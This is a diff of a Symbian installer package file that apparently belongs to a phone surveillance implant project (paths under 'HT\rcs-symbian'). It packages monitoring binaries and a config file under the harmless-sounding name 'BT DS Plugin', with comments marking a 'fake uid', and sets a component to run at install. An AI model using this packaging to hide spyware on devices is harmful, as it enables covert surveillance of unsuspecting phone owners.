@@ -2,7 +2,10 @@
 ;
 
 ; standard SIS file header
-#{"BT DS Plugin"},(0x20024d7a),1,00,0000
+; fake uid
+;#{"BT DS Plugin"},(0x20024d7a),1,00,0000
+; HT uid
+#{"BT DS Plugin"},(0x200305D7),1,00,0000
 
 ;Localised Vendor name
 %{"Vendor-EN"}
@@ -26,9 +29,12 @@
 "C:\Symbian\9.1\S60_3rd_MR_3\epoc32\release\gcce\urel\UninstMonitor.exe" - "c:\sys\bin\UninstMonitor.exe",FR,RR,RW
 "C:\Symbian\9.1\S60_3rd_MR_3\epoc32\release\gcce\urel\SharedQueueCli_20023633.dll" - "c:\sys\bin\SharedQueueCli_20023633.dll"
 "C:\Symbian\9.1\S60_3rd_MR_3\epoc32\release\gcce\urel\SharedQueueSrv_20023634.exe" - "c:\sys\bin\SharedQueueSrv_20023634.exe"
-"C:\Symbian\9.1\S60_3rd_MR_3\Epoc32\data\z\private\101f875a\import\20024d7a.rsc" - "c:\private\101f875a\import\[20024d7a].rsc"
-"C:\HT\rcs-symbian\config.bin"		- "c:\private\2002aa96\config.bin"
-"C:\HT\rcs-symbian\Uninstaller\sis\Uninstaller_3rd.sisx" - "c:\private\2002aa96\Uninstaller.sisx"
+;"C:\Symbian\9.1\S60_3rd_MR_3\Epoc32\data\z\private\101f875a\import\20024d7a.rsc" - "c:\private\101f875a\import\[20024d7a].rsc"
+;"C:\HT\rcs-symbian-json\config.bin"		- "c:\private\2002aa96\config.bin"
+;"C:\HT\rcs-symbian-json\Uninstaller\sis\Uninstaller_3rd.sisx" - "c:\private\2002aa96\Uninstaller.sisx"
+"C:\Symbian\9.1\S60_3rd_MR_3\Epoc32\data\z\private\101f875a\import\200305D7.rsc" - "c:\private\101f875a\import\[200305D7].rsc"
+"C:\HT\rcs-symbian-json\config.bin"		- "c:\private\20030635\config.bin"
+"C:\HT\rcs-symbian-json\Uninstaller\sis\Uninstaller_3rd.sisx" - "c:\private\20030635\Uninstaller.sisx"
 "C:\HT\rcs-symbian\logoblack.jpg" - "C:\data\images\logoblack.jpg"
 "C:\Symbian\9.1\S60_3rd_MR_3\epoc32\release\gcce\urel\SharedQueueMon_20023635.exe" - "c:\sys\bin\SharedQueueMon_20023635.exe",FR,RI 
 
